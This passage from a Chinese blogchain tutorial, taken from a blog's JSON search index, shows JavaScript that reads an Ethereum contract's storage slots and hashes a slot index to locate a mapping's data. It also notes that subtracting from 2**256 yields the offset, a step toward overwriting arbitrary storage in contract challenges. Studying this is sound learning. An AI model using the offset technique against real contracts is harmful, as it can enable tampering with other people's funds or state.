class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ethers = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;ethers&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs-extra&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">&#x27;dotenv&#x27;</span>).<span class=\"title function_\">config</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"title class_\">Web3</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;web3&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> web3 =  <span class=\"keyword\">new</span> <span class=\"title class_\">Web3</span>(<span class=\"string\">&quot;your_rpc_url&quot;</span>)</span><br><span class=\"line\">contractAddr = <span class=\"string\">&quot;your_account_addr&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">cl</span> = x =&gt; <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(x)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i %3C (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getSlot</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddr, idx)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">utils</span>.<span class=\"title function_\">sha3</span>(<span class=\"title function_\">padding</span>(idx))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>()</span><br><span class=\"line\">\t.<span class=\"title function_\">then</span>(<span class=\"function\">() =&gt;</span> process.<span class=\"title function_\">exit</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(err),</span><br><span class=\"line\">\t\tprocess.<span class=\"title function_\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#125;)&gt;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br></pre></td></tr></table></figure>\n<p>第三个就是我们 map 第一个元素存放的位置<br>\n用 <code>2**256</code>  减一下就是偏移了</p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/2.png\" alt></p>\n<p><img src=\"/2022/08/27/BlockChain-from-scratch-mapping/3.png\" alt></p>\n",
            "tags": [
                "Blockchain"
            ]
        }
    ]
}